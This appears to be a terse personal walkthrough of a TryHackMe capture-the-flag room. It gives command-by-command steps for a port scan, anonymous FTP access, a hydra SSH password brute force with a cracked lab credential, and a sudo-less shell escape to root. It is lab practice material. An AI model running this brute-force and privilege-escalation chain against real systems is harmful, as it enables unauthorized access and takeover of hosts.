+++
title = "Brooklyn Nine Nine"
+++
# https://tryhackme.com/room/brooklynninenine

```bash
=================================
10.201.100.181 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.100.181' >> ~/.zshrc && source ~/.zshrc

2025-09-30 14:17:14 -- sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -A
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
Logged in as ftp
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)

### FTP

2025-09-30 14:17:16 -- ftp $TARGET
2025-09-30 14:17:32 -- get note_to_jake.txt
// From Amy,
// Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

### SSH

2025-09-30 14:24:39 -- hydra -t 4 -l jake -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
// [22][ssh] host: 10.201.100.181   login: jake   password: 987654321

2025-09-30 14:24:55 -- sshpass -p '987654321' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 jake@$TARGET
// success

// doing linpeas
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
// nice
sudo less /etc/profile
!/bin/sh
// root!

sudo find / -type f \( -name "user.txt" -o -name "root.txt" -o -name "flag.txt" \) 2>/dev/null
// flags
```